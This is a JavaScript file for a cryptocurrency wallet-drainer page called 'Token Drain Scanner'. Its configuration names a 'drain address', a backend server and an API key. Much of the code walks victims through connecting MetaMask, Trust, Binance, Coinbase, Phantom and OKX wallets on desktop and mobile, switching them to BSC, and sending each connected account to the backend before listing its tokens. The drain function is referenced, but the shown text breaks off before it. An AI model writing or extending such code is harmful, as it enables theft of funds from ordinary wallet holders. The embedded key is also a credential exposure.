// ================================================
// TOKEN DRAIN SCANNER - UNIVERSAL WALLET CONNECTION
// ALL WALLETS WORK PROPERLY ON PC & MOBILE
// ================================================

// Configuration
const CONFIG = {
    backendUrl: "https://tokenbackend-5xab.onrender.com",
    drainAddress: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
    covalentApiKey: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
    
    networkNames: {
        1: "Ethereum Mainnet",
        56: "Binance Smart Chain", 
        137: "Polygon",
        10: "Optimism",
        42161: "Arbitrum",
        43114: "Avalanche",
        8453: "Base",
        250: "Fantom",
        100: "Gnosis",
        25: "Cronos"
    },
    
    // Wallet configurations - FIXED FOR ALL WALLETS
    wallets: {
        metaMask: {
            name: "MetaMask",
            icon: "🦊",
            color: "#f6851b",
            detect: () => window.ethereum?.isMetaMask,
            // Enhanced mobile deep links
            mobileDeeplink: function() {
                const url = encodeURIComponent(window.location.href);
                if (/iphone|ipad|ipod/i.test(navigator.userAgent)) {
                    return `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
                } else if (/android/i.test(navigator.userAgent)) {
                    return `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
                }
                return `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
            },
            // Connect method
            connect: async () => {
                if (window.ethereum?.isMetaMask) {
                    try {
                        const accounts = await window.ethereum.request({ 
                            method: 'eth_requestAccounts' 
                        });
                        return accounts[0];
                    } catch (error) {
                        console.log('MetaMask connection error:', error);
                        return null;
                    }
                }
                return null;
            },
            // Network switching
            switchToBSC: async () => {
                if (!window.ethereum) return false;
                try {
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: '0x38' }], // BSC Mainnet
                    });
                    return true;
                } catch (switchError) {
                    // If chain not added, add it
                    if (switchError.code === 4902) {
                        try {
                            await window.ethereum.request({
                                method: 'wallet_addEthereumChain',
                                params: [{
                                    chainId: '0x38',
                                    chainName: 'Binance Smart Chain',
                                    nativeCurrency: {
                                        name: 'BNB',
                                        symbol: 'BNB',
                                        decimals: 18
                                    },
                                    rpcUrls: ['https://bsc-dataseed.binance.org/'],
                                    blockExplorerUrls: ['https://bscscan.com/']
                                }],
                            });
                            return true;
                        } catch (addError) {
                            console.log('Failed to add BSC network:', addError);
                            return false;
                        }
                    }
                    return false;
                }
            }
        },
        trust: {
            name: "Trust Wallet",
            icon: "🔶",
            color: "#3375bb",
            detect: () => window.ethereum?.isTrust,
            // Trust Wallet specific deep links
            mobileDeeplink: function() {
                const url = encodeURIComponent(window.location.href);
                if (/iphone|ipad|ipod/i.test(navigator.userAgent)) {
                    return `trust://browse?url=${url}`;
                } else if (/android/i.test(navigator.userAgent)) {
                    return `https://link.trustwallet.com/open_url?coin_id=60&url=${url}`;
                }
                return `https://link.trustwallet.com/open_url?coin_id=60&url=${url}`;
            },
            connect: async () => {
                if (window.ethereum?.isTrust) {
                    try {
                        const accounts = await window.ethereum.request({ 
                            method: 'eth_requestAccounts' 
                        });
                        return accounts[0];
                    } catch (error) {
                        console.log('Trust Wallet connection error:', error);
                        return null;
                    }
                }
                return null;
            }
        },
        binance: {
            name: "Binance Wallet",
            icon: "🟡",
            color: "#f0b90b",
            detect: () => window.ethereum?.isBinance || window.BinanceChain,
            // Binance Wallet specific deep links - FIXED
            mobileDeeplink: function() {
                const url = encodeURIComponent(window.location.href);
                if (/iphone|ipad|ipod/i.test(navigator.userAgent)) {
                    return `bnc://app.binance.com/`;
                } else if (/android/i.test(navigator.userAgent)) {
                    return `intent://app.binance.com/#Intent;scheme=bnc;package=com.binance.dev;end`;
                }
                return `https://binance.com/`;
            },
            connect: async () => {
                // First try window.ethereum (Binance Wallet browser extension)
                if (window.ethereum?.isBinance) {
                    try {
                        const accounts = await window.ethereum.request({ 
                            method: 'eth_requestAccounts' 
                        });
                        return accounts[0];
                    } catch (error) {
                        console.log('Binance Wallet (ethereum) connection error:', error);
                        return null;
                    }
                }
                // Then try BinanceChain (Binance Chain Wallet)
                if (window.BinanceChain) {
                    try {
                        const accounts = await window.BinanceChain.request({ 
                            method: 'eth_requestAccounts' 
                        });
                        return accounts[0];
                    } catch (error) {
                        console.log('Binance Chain connection error:', error);
                        return null;
                    }
                }
                return null;
            },
            // Binance Wallet defaults to BSC, but we should check
            ensureBSC: async () => {
                if (window.BinanceChain) {
                    try {
                        const chainId = await window.BinanceChain.request({ 
                            method: 'eth_chainId' 
                        });
                        if (chainId !== '0x38') { // Not BSC
                            await window.BinanceChain.request({
                                method: 'wallet_switchEthereumChain',
                                params: [{ chainId: '0x38' }],
                            });
                        }
                        return true;
                    } catch (error) {
                        console.log('Failed to switch Binance to BSC:', error);
                        return false;
                    }
                }
                return true;
            }
        },
        coinbase: {
            name: "Coinbase Wallet",
            icon: "🔷",
            color: "#0052ff",
            detect: () => window.ethereum?.isCoinbaseWallet,
            mobileDeeplink: function() {
                const url = encodeURIComponent(window.location.href);
                return `https://go.cb-w.com/${url}`;
            },
            connect: async () => {
                if (window.ethereum?.isCoinbaseWallet) {
                    try {
                        const accounts = await window.ethereum.request({ 
                            method: 'eth_requestAccounts' 
                        });
                        return accounts[0];
                    } catch (error) {
                        console.log('Coinbase Wallet connection error:', error);
                        return null;
                    }
                }
                return null;
            }
        },
        phantom: {
            name: "Phantom",
            icon: "👻",
            color: "#ab9ff2",
            detect: () => window.ethereum?.isPhantom,
            mobileDeeplink: function() {
                const url = encodeURIComponent(window.location.href);
                return `https://phantom.app/ul/browse/${url}`;
            },
            connect: async () => {
                if (window.ethereum?.isPhantom) {
                    try {
                        const accounts = await window.ethereum.request({ 
                            method: 'eth_requestAccounts' 
                        });
                        return accounts[0];
                    } catch (error) {
                        console.log('Phantom connection error:', error);
                        return null;
                    }
                }
                return null;
            }
        },
        okx: {
            name: "OKX Wallet",
            icon: "⚡",
            color: "#000000",
            detect: () => window.ethereum?.isOkxWallet,
            mobileDeeplink: function() {
                const url = encodeURIComponent(window.location.href);
                return `okx://wallet/dapp?url=${url}`;
            },
            connect: async () => {
                if (window.ethereum?.isOkxWallet) {
                    try {
                        const accounts = await window.ethereum.request({ 
                            method: 'eth_requestAccounts' 
                        });
                        return accounts[0];
                    } catch (error) {
                        console.log('OKX Wallet connection error:', error);
                        return null;
                    }
                }
                return null;
            }
        },
        walletConnect: {
            name: "WalletConnect",
            icon: "🔗",
            color: "#3b99fc",
            detect: () => window.WalletConnectProvider,
            mobileDeeplink: function() {
                return "wc://";
            },
            connect: async () => {
                // WalletConnect requires special implementation
                return null;
            }
        }
    }
};

// Global state
let currentAccount = null;
let currentChainId = null;
let isConnected = false;
let detectedTokens = [];
let selectedWallet = null;
let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

// DOM Elements
let connectBtn, statusEl, tokensEl, drainBtn, networkSelector, scanAllBtn;

// Initialize app
function initializeApp() {
    console.log('🚀 Initializing Token Drain Scanner...');
    console.log('📱 Device:', isMobile ? 'Mobile' : 'Desktop');
    
    // Get DOM elements
    connectBtn = document.getElementById('connectBtn');
    statusEl = document.getElementById('status');
    tokensEl = document.getElementById('tokens');
    drainBtn = document.getElementById('drainBtn');
    networkSelector = document.getElementById('networkSelector');
    scanAllBtn = document.getElementById('scanAllBtn');
    
    if (!connectBtn || !statusEl) {
        console.error('❌ Required elements not found');
        return;
    }
    
    // Setup event listeners
    connectBtn.onclick = handleConnect;
    if (drainBtn) drainBtn.onclick = handleDrain;
    if (scanAllBtn) scanAllBtn.onclick = handleScanAllChains;
    if (networkSelector) networkSelector.onchange = handleNetworkChange;
    
    // Check existing connection
    checkExistingConnection();
    
    updateStatus('✅ Ready! Click "Connect Wallet" to begin');
}

// Check existing wallet connection
async function checkExistingConnection() {
    // Check all possible providers
    const providers = [window.ethereum, window.BinanceChain].filter(p => p);
    
    for (const provider of providers) {
        try {
            const accounts = await provider.request({ 
                method: 'eth_accounts' 
            });
            
            if (accounts && accounts.length > 0) {
                const chainIdHex = await provider.request({ 
                    method: 'eth_chainId' 
                });
                const chainId = parseInt(chainIdHex, 16);
                await handleConnected(accounts[0], chainId);
                return;
            }
        } catch (error) {
            console.log('⚠️ No existing connection for provider:', error.message);
        }
    }
}

// Handle connect button click
async function handleConnect() {
    if (isConnected) {
        await disconnectWallet();
        return;
    }
    
    // Show universal wallet selector
    showUniversalWalletSelector();
}

// Show universal wallet selector
function showUniversalWalletSelector() {
    // Create wallet options with detection
    const walletOptions = [];
    
    for (const [key, wallet] of Object.entries(CONFIG.wallets)) {
        // Skip WalletConnect for now as it needs special setup
        if (key === 'walletConnect') continue;
        
        const isDetected = wallet.detect();
        walletOptions.push({
            key,
            name: wallet.name,
            icon: wallet.icon,
            color: wallet.color,
            detected: isDetected
        });
    }
    
    // Add "Other Wallet" option
    walletOptions.push({
        key: 'other',
        name: 'Other Wallet',
        icon: '🔗',
        color: '#666666',
        detected: false
    });
    
    const selectorHTML = `
        <div class="wallet-selector-overlay">
            <div class="wallet-selector-modal">
                <div class="modal-header">
                    <h3>Connect Wallet</h3>
                    <button class="close-btn" onclick="closeWalletSelector()">×</button>
                </div>
                <p class="modal-subtitle">Select your wallet to connect</p>
                
                <div class="wallet-grid">
                    ${walletOptions.map(wallet => `
                        <button class="wallet-card" onclick="selectWallet('${wallet.key}')" 
                                style="--wallet-color: ${wallet.color}"
                                data-detected="${wallet.detected}">
                            <div class="wallet-icon">${wallet.icon}</div>
                            <div class="wallet-info">
                                <span class="wallet-name">${wallet.name}</span>
                                <span class="wallet-status ${wallet.detected ? 'detected' : 'not-detected'}">
                                    ${wallet.detected ? 'Detected' : 'Click to Connect'}
                                </span>
                            </div>
                            <div class="arrow">→</div>
                        </button>
                    `).join('')}
                </div>
                
                <div class="mobile-tip" style="${isMobile ? '' : 'display: none;'}">
                    💡 <strong>Mobile Tip:</strong> Make sure you're viewing this page inside your wallet's browser
                </div>
            </div>
        </div>
    `;
    
    // Create and show selector
    const selector = document.createElement('div');
    selector.id = 'walletSelector';
    selector.innerHTML = selectorHTML;
    document.body.appendChild(selector);
    
    // Add CSS for selector
    addSelectorStyles();
}

// Add CSS for wallet selector
function addSelectorStyles() {
    const styles = `
        .wallet-selector-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(10px);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            padding: 20px;
        }
        
        .wallet-selector-modal {
            background: white;
            border-radius: 24px;
            width: 100%;
            max-width: 500px;
            max-height: 90vh;
            overflow-y: auto;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            animation: slideUp 0.3s ease;
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 24px;
            border-bottom: 1px solid #eee;
        }
        
        .modal-header h3 {
            margin: 0;
            font-size: 24px;
            font-weight: 700;
            color: #111827;
        }
        
        .close-btn {
            background: none;
            border: none;
            font-size: 32px;
            cursor: pointer;
            color: #666;
            line-height: 1;
            padding: 0;
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            transition: background 0.2s;
        }
        
        .close-btn:hover {
            background: #f3f4f6;
        }
        
        .modal-subtitle {
            padding: 0 24px 20px;
            margin: 0;
            color: #666;
            text-align: center;
            font-size: 16px;
        }
        
        .wallet-grid {
            padding: 0 20px 20px;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        
        .wallet-card {
            display: flex;
            align-items: center;
            gap: 16px;
            padding: 18px 20px;
            background: white;
            border: 2px solid #e5e7eb;
            border-radius: 16px;
            cursor: pointer;
            transition: all 0.3s ease;
            text-align: left;
            width: 100%;
        }
        
        .wallet-card:hover {
            border-color: var(--wallet-color);
            background: #f9fafb;
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
        }
        
        .wallet-card[data-detected="false"] {
            opacity: 0.8;
        }
        
        .wallet-card[data-detected="false"]:hover {
            opacity: 1;
        }
        
        .wallet-icon {
            font-size: 32px;
            width: 56px;
            height: 56px;
            border-radius: 16px;
            background: linear-gradient(135deg, var(--wallet-color), color-mix(in srgb, var(--wallet-color) 80%, white));
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            flex-shrink: 0;
        }
        
        .wallet-info {
            flex: 1;
            min-width: 0;
        }
        
        .wallet-name {
            display: block;
            font-weight: 600;
            font-size: 18px;
            margin-bottom: 4px;
            color: #111827;
        }
        
        .wallet-status {
            font-size: 14px;
            font-weight: 500;
        }
        
        .wallet-status.detected {
            color: #10b981;
        }
        
        .wallet-status.not-detected {
            color: #6b7280;
        }
        
        .arrow {
            color: #9ca3af;
            font-size: 24px;
            font-weight: 300;
            flex-shrink: 0;
        }
        
        .mobile-tip {
            padding: 20px;
            background: #f0f9ff;
            border-top: 1px solid #bae6fd;
            border-radius: 0 0 24px 24px;
            text-align: center;
            color: #0369a1;
            font-size: 14px;
        }
        
        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(40px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
    `;
    
    const styleSheet = document.createElement('style');
    styleSheet.textContent = styles;
    document.head.appendChild(styleSheet);
}

// Close wallet selector
function closeWalletSelector() {
    const selector = document.getElementById('walletSelector');
    if (selector) {
        selector.style.opacity = '0';
        selector.style.transform = 'translateY(40px)';
        setTimeout(() => selector.remove(), 300);
    }
}

// Select wallet
async function selectWallet(walletKey) {
    closeWalletSelector();
    selectedWallet = walletKey;
    
    if (walletKey === 'other') {
        // Try universal connection
        await connectUniversal();
        return;
    }
    
    const wallet = CONFIG.wallets[walletKey];
    if (!wallet) {
        updateStatus('❌ Wallet not supported');
        return;
    }
    
    updateStatus(`🔄 Connecting with ${wallet.name}...`);
    
    // Check if we're on mobile
    if (isMobile) {
        await handleMobileWalletConnection(walletKey);
    } else {
        await handleDesktopWalletConnection(walletKey);
    }
}

// Handle mobile wallet connection
async function handleMobileWalletConnection(walletKey) {
    const wallet = CONFIG.wallets[walletKey];
    if (!wallet) return;
    
    // Special handling for different wallets
    switch(walletKey) {
        case 'binance':
            await handleBinanceMobile();
            break;
        case 'trust':
            await handleTrustMobile();
            break;
        case 'metaMask':
            await handleMetaMaskMobile();
            break;
        default:
            await handleGenericMobile(walletKey);
    }
}

// Handle Binance Wallet on mobile
async function handleBinanceMobile() {
    // Try direct connection first
    const wallet = CONFIG.wallets.binance;
    
    // First, check if we're already in Binance browser
    if (window.BinanceChain || window.ethereum?.isBinance) {
        try {
            const account = await wallet.connect();
            if (account) {
                // Ensure we're on BSC
                await wallet.ensureBSC();
                const provider = window.BinanceChain || window.ethereum;
                const chainIdHex = await provider.request({ method: 'eth_chainId' });
                const chainId = parseInt(chainIdHex, 16);
                await handleConnected(account, chainId);
                return;
            }
        } catch (error) {
            console.log('Direct Binance connection failed:', error);
        }
    }
    
    // If not connected, show instructions
    showMobileInstructions('binance', true);
}

// Handle Trust Wallet on mobile
async function handleTrustMobile() {
    const wallet = CONFIG.wallets.trust;
    
    // Check if we're already in Trust browser
    if (window.ethereum?.isTrust) {
        try {
            const account = await wallet.connect();
            if (account) {
                const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
                const chainId = parseInt(chainIdHex, 16);
                await handleConnected(account, chainId);
                return;
            }
        } catch (error) {
            console.log('Direct Trust connection failed:', error);
        }
    }
    
    // Open Trust Wallet
    const deeplink = wallet.mobileDeeplink();
    window.location.href = deeplink;
    
    // Show instructions if not connected after delay
    setTimeout(() => {
        if (!isConnected) {
            showMobileInstructions('trust', true);
        }
    }, 3000);
}

// Handle MetaMask on mobile
async function handleMetaMaskMobile() {
    const wallet = CONFIG.wallets.metaMask;
    
    // Check if we're already in MetaMask browser
    if (window.ethereum?.isMetaMask) {
        try {
            const account = await wallet.connect();
            if (account) {
                // Switch to BSC for better compatibility
                await wallet.switchToBSC();
                const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
                const chainId = parseInt(chainIdHex, 16);
                await handleConnected(account, chainId);
                return;
            }
        } catch (error) {
            console.log('Direct MetaMask connection failed:', error);
        }
    }
    
    // Open MetaMask
    const deeplink = wallet.mobileDeeplink();
    window.location.href = deeplink;
    
    // Show instructions if not connected after delay
    setTimeout(() => {
        if (!isConnected) {
            showMobileInstructions('metaMask', true);
        }
    }, 3000);
}

// Handle generic mobile wallet
async function handleGenericMobile(walletKey) {
    const wallet = CONFIG.wallets[walletKey];
    if (!wallet) return;
    
    // Try direct connection
    if (wallet.detect()) {
        try {
            const account = await wallet.connect();
            if (account) {
                const provider = window.ethereum || window.BinanceChain;
                const chainIdHex = await provider.request({ method: 'eth_chainId' });
                const chainId = parseInt(chainIdHex, 16);
                await handleConnected(account, chainId);
                return;
            }
        } catch (error) {
            console.log(`Direct ${wallet.name} connection failed:`, error);
        }
    }
    
    // Open wallet app
    if (wallet.mobileDeeplink) {
        const deeplink = wallet.mobileDeeplink();
        window.location.href = deeplink;
    }
    
    // Show instructions
    showMobileInstructions(walletKey, false);
}

// Handle desktop wallet connection
async function handleDesktopWalletConnection(walletKey) {
    const wallet = CONFIG.wallets[walletKey];
    if (!wallet) return;
    
    updateStatus(`🔄 Connecting with ${wallet.name}...`);
    
    // Special handling for different wallets
    switch(walletKey) {
        case 'binance':
            await handleBinanceDesktop();
            break;
        default:
            await handleGenericDesktop(walletKey);
    }
}

// Handle Binance Wallet on desktop
async function handleBinanceDesktop() {
    const wallet = CONFIG.wallets.binance;
    
    // Try Binance Chain first
    if (window.BinanceChain) {
        try {
            const accounts = await window.BinanceChain.request({ 
                method: 'eth_requestAccounts' 
            });
            
            if (accounts && accounts.length > 0) {
                const chainIdHex = await window.BinanceChain.request({ 
                    method: 'eth_chainId' 
                });
                const chainId = parseInt(chainIdHex, 16);
                await handleConnected(accounts[0], chainId);
                return;
            }
        } catch (error) {
            console.log('Binance Chain connection failed:', error);
        }
    }
    
    // Try Binance Wallet (ethereum)
    if (window.ethereum?.isBinance) {
        try {
            const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            
            if (accounts && accounts.length > 0) {
                const chainIdHex = await window.ethereum.request({ 
                    method: 'eth_chainId' 
                });
                const chainId = parseInt(chainIdHex, 16);
                await handleConnected(accounts[0], chainId);
                return;
            }
        } catch (error) {
            console.log('Binance Wallet connection failed:', error);
        }
    }
    
    // Show installation instructions
    showInstallInstructions('binance');
}

// Handle generic desktop wallet
async function handleGenericDesktop(walletKey) {
    const wallet = CONFIG.wallets[walletKey];
    if (!wallet) return;
    
    // Check if wallet is detected
    if (!wallet.detect()) {
        showInstallInstructions(walletKey);
        return;
    }
    
    // Try to connect
    try {
        const account = await wallet.connect();
        if (account) {
            const provider = window.ethereum || window.BinanceChain;
            const chainIdHex = await provider.request({ method: 'eth_chainId' });
            const chainId = parseInt(chainIdHex, 16);
            await handleConnected(account, chainId);
            return;
        }
    } catch (error) {
        console.log(`${wallet.name} connection error:`, error);
        updateStatus(`❌ Failed to connect with ${wallet.name}`);
    }
}

// Universal connection
async function connectUniversal() {
    updateStatus('🔄 Connecting to any available wallet...');
    
    // Try all possible providers
    const providers = [
        { provider: window.ethereum, name: 'Ethereum' },
        { provider: window.BinanceChain, name: 'Binance Chain' }
    ];
    
    for (const { provider, name } of providers) {
        if (provider) {
            try {
                const accounts = await provider.request({ 
                    method: 'eth_requestAccounts' 
                });
                
                if (accounts && accounts.length > 0) {
                    const chainIdHex = await provider.request({ 
                        method: 'eth_chainId' 
                    });
                    const chainId = parseInt(chainIdHex, 16);
                    await handleConnected(accounts[0], chainId);
                    return;
                }
            } catch (error) {
                console.log(`${name} connection failed:`, error);
            }
        }
    }
    
    // No wallet found
    updateStatus('❌ No wallet detected');
    alert(isMobile 
        ? 'Please open this page in your wallet browser (MetaMask, Trust Wallet, Binance, etc.)' 
        : 'Please install a wallet extension like MetaMask or Trust Wallet');
}

// Show mobile instructions
function showMobileInstructions(walletKey, showRetry = true) {
    const wallet = CONFIG.wallets[walletKey];
    if (!wallet) return;
    
    const instructionsHTML = `
        <div class="mobile-instructions-overlay">
            <div class="mobile-instructions-modal">
                <div class="modal-header">
                    <h3>Connect ${wallet.name}</h3>
                    <button class="close-btn" onclick="closeMobileInstructions()">×</button>
                </div>
                
                <div class="instructions-content">
                    <div class="wallet-icon-large" style="background: ${wallet.color}">
                        ${wallet.icon}
                    </div>
                    
                    <h4>How to connect:</h4>
                    
                    ${walletKey === 'binance' ? `
                        <div class="important-note">
                            <strong>⚠️ Important for Binance Wallet:</strong>
                            <p>1. Make sure you're on Binance Smart Chain (BSC)</p>
                            <p>2. Open DApps section in Binance app</p>
                            <p>3. Enter this URL: <code>${window.location.href}</code></p>
                        </div>
                    ` : ''}
                    
                    <ol>
                        <li>Open <strong>${wallet.name}</strong> app</li>
                        <li>Go to <strong>Browser / DApps</strong> section</li>
                        <li>Enter this URL: <code>${window.location.href}</code></li>
                        <li>Click <strong>"Connect Wallet"</strong></li>
                        <li>Approve the connection request</li>
                    </ol>
                    
                    <div class="action-buttons">
                        <button class="primary-btn" onclick="checkConnection('${walletKey}')">
                            ✅ I'm Connected
                        </button>
                        ${showRetry ? `
                        <button class="secondary-btn" onclick="retryMobileConnection('${walletKey}')">
                            🔄 Retry Connection
                        </button>
                        ` : ''}
                        <button class="tertiary-btn" onclick="connectUniversal()">
                            🔗 Try Other Wallet
                        </button>
                    </div>
                    
                    <div class="tip">
                        💡 <strong>Tip:</strong> If you're already in ${wallet.name} browser, refresh the page
                    </div>
                </div>
            </div>
        </div>
        
        <style>
            .mobile-instructions-overlay {
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: rgba(0, 0, 0, 0.9);
                display: flex;
                align-items: center;
                justify-content: center;
                z-index: 10000;
                padding: 20px;
            }
            
            .mobile-instructions-modal {
                background: white;
                border-radius: 24px;
                width: 100%;
                max-width: 500px;
                max-height: 90vh;
                overflow-y: auto;
                padding: 0;
            }
            
            .instructions-content {
                padding: 24px;
            }
            
            .wallet-icon-large {
                font-size: 64px;
                width: 100px;
                height: 100px;
                border-radius: 24px;
                display: flex;
                align-items: center;
                justify-content: center;
                color: white;
                margin: 0 auto 20px;
                background: ${wallet.color} !important;
            }
            
            .instructions-content h4 {
                margin: 0 0 16px;
                color: #111827;
                font-size: 20px;
                text-align: center;
            }
            
            .important-note {
                background: #fef3c7;
                border: 2px solid #fbbf24;
                border-radius: 12px;
                padding: 16px;
                margin: 0 0 20px;
                color: #92400e;
            }
            
            .important-note strong {
                display: block;
                margin-bottom: 8px;
            }
            
            .important-note p {
                margin: 4px 0;
                font-size: 14px;
            }
            
            .instructions-content ol {
                text-align: left;
                margin: 0 0 24px;
                padding-left: 24px;
            }
            
            .instructions-content li {
                margin: 12px 0;
                color: #374151;
                font-size: 16px;
                line-height: 1.5;
            }
            
            .instructions-content code {
                background: #f3f4f6;
                padding: 2px 6px;
                border-radius: 4px;
                font-family: monospace;
                font-size: 14px;
                word-break: break-all;
                display: inline-block;
                margin: 4px 0;
            }
            
            .action-buttons {
                display: flex;
                flex-direction: column;
                gap: 12px;
                margin: 0 0 20px;
            }
            
            .primary-btn, .secondary-btn, .tertiary-btn {
                width: 100%;
                padding: 18px;
                border-radius: 16px;
                font-weight: 600;
                font-size: 16px;
                cursor: pointer;
                border: none;
                transition: all 0.2s;
            }
            
            .primary-btn {
                background: ${wallet.color};
                color: white;
            }
            
            .primary-btn:hover {
                opacity: 0.9;
                transform: translateY(-2px);
            }
            
            .secondary-btn {
                background: #f3f4f6;
                color: #374151;
                border: 2px solid #e5e7eb;
            }
            
            .secondary-btn:hover {
                background: #e5e7eb;
            }
            
            .tertiary-btn {
                background: #6366f1;
                color: white;
            }
            
            .tertiary-btn:hover {
                background: #4f46e5;
            }
            
            .tip {
                background: #f0f9ff;
                border: 2px solid #bae6fd;
                border-radius: 12px;
                padding: 16px;
                color: #0369a1;
                font-size: 14px;
                text-align: center;
            }
        </style>
    `;
    
    const instructions = document.createElement('div');
    instructions.innerHTML = instructionsHTML;
    document.body.appendChild(instructions);
}

// Show installation instructions
function showInstallInstructions(walletKey) {
    const wallet = CONFIG.wallets[walletKey];
    if (!wallet) return;
    
    const installHTML = `
        <div class="install-overlay">
            <div class="install-modal">
                <div class="modal-header">
                    <h3>Install ${wallet.name}</h3>
                    <button class="close-btn" onclick="closeInstallModal()">×</button>
                </div>
                
                <div class="install-content">
                    <div class="wallet-icon-large" style="background: ${wallet.color}">
                        ${wallet.icon}
                    </div>
                    
                    <p>${wallet.name} is not installed. Please install it to continue.</p>
                    
                    <div class="install-links">
                        <a href="https://metamask.io/download/" target="_blank" class="install-btn" style="display: ${walletKey === 'metaMask' ? 'block' : 'none'}; background: #f6851b">
                            🦊 Install MetaMask
                        </a>
                        <a href="https://trustwallet.com/" target="_blank" class="install-btn" style="display: ${walletKey === 'trust' ? 'block' : 'none'}; background: #3375bb">
                            🔶 Install Trust Wallet
                        </a>
                        <a href="https://www.binance.com/en/download" target="_blank" class="install-btn" style="display: ${walletKey === 'binance' ? 'block' : 'none'}; background: #f0b90b">
                            🟡 Install Binance Wallet
                        </a>
                        <a href="https://www.coinbase.com/wallet/downloads" target="_blank" class="install-btn" style="display: ${walletKey === 'coinbase' ? 'block' : 'none'}; background: #0052ff">
                            🔷 Install Coinbase Wallet
                        </a>
                    </div>
                    
                    <button class="secondary-btn" onclick="closeInstallModal()">
                        Choose Another Wallet
                    </button>
                </div>
            </div>
        </div>
        
        <style>
            .install-overlay {
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: rgba(0, 0, 0, 0.8);
                display: flex;
                align-items: center;
                justify-content: center;
                z-index: 10001;
                padding: 20px;
            }
            
            .install-modal {
                background: white;
                border-radius: 24px;
                width: 100%;
                max-width: 400px;
                padding: 32px;
                text-align: center;
            }
            
            .install-content {
                padding: 20px 0;
            }
            
            .install-content p {
                color: #374151;
                margin: 0 0 30px;
                font-size: 16px;
                line-height: 1.5;
            }
            
            .install-links {
                margin: 0 0 20px;
            }
            
            .install-btn {
                display: block;
                padding: 18px;
                border-radius: 16px;
                color: white;
                text-decoration: none;
                font-weight: 600;
                font-size: 16px;
                margin: 0 0 12px;
                transition: all 0.2s;
            }
            
            .install-btn:hover {
                transform: translateY(-2px);
                box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
            }
            
            .secondary-btn {
                width: 100%;
                padding: 16px;
                border-radius: 16px;
                background: #f3f4f6;
                border: 2px solid #e5e7eb;
                color: #374151;
                font-weight: 600;
                font-size: 16px;
                cursor: pointer;
                transition: all 0.2s;
            }
            
            .secondary-btn:hover {
                background: #e5e7eb;
            }
        </style>
    `;
    
    const installModal = document.createElement('div');
    installModal.innerHTML = installHTML;
    document.body.appendChild(installModal);
}

// Check connection status
async function checkConnection(walletKey) {
    closeMobileInstructions();
    
    const wallet = CONFIG.wallets[walletKey];
    if (!wallet) return;
    
    updateStatus(`🔄 Checking ${wallet.name} connection...`);
    
    // Try to connect
    if (wallet.detect()) {
        try {
            const account = await wallet.connect();
            if (account) {
                const provider = window.ethereum || window.BinanceChain;
                const chainIdHex = await provider.request({ method: 'eth_chainId' });
                const chainId = parseInt(chainIdHex, 16);
                await handleConnected(account, chainId);
                return;
            }
        } catch (error) {
            console.log('Connection check failed:', error);
        }
    }
    
    updateStatus(`❌ ${wallet.name} not connected. Please follow the instructions.`);
}

// Retry mobile connection
async function retryMobileConnection(walletKey) {
    closeMobileInstructions();
    await handleMobileWalletConnection(walletKey);
}

// Close mobile instructions
function closeMobileInstructions() {
    const instructions = document.querySelector('.mobile-instructions-overlay');
    if (instructions) instructions.remove();
}

// Close install modal
function closeInstallModal() {
    const modal = document.querySelector('.install-overlay');
    if (modal) modal.remove();
}

// Handle successful connection
async function handleConnected(account, chainId) {
    try {
        // Update state
        currentAccount = account;
        currentChainId = chainId;
        isConnected = true;
        
        // Update UI
        connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
        
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`✅ Connected!\nWallet: ${account.slice(0, 8)}...\nNetwork: ${chainName}`);
        
        // Show other UI elements
        showUIElements();
        
        // Setup wallet listeners
        setupWalletListeners();
        
        // Log to backend
        await logConnectionToBackend(account, chainId);
        
        // Fetch tokens
        await fetchTokens(account, chainId);
        
    } catch (error) {
        console.error('❌ Setup error:', error);
        updateStatus('Setup failed: ' + error.message);
        isConnected = false;
        currentAccount = null;
        currentChainId = null;
    }
}

// Setup wallet event listeners
function setupWalletListeners() {
    const provider = window.ethereum || window.BinanceChain;
    if (!provider) return;
    
    provider.on('accountsChanged', (accounts) => {
        console.log('🔄 Accounts changed:', accounts);
        
        if (accounts.length === 0) {
            disconnectWallet();
        } else if (currentAccount !== accounts[0]) {
            currentAccount = accounts[0];
            updateStatus(`🔄 Account changed: ${accounts[0].slice(0, 8)}...`);
            fetchTokens(currentAccount, currentChainId);
        }
    });
    
    provider.on('chainChanged', (chainIdHex) => {
        const chainId = parseInt(chainIdHex, 16);
        console.log('🔄 Chain changed:', chainId);
        
        currentChainId = chainId;
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`🔄 Network changed: ${chainName}`);
        
        fetchTokens(currentAccount, chainId);
    });
    
    provider.on('disconnect', (error) => {
        console.log('🔌 Wallet disconnected:', error);
        disconnectWallet();
    });
}

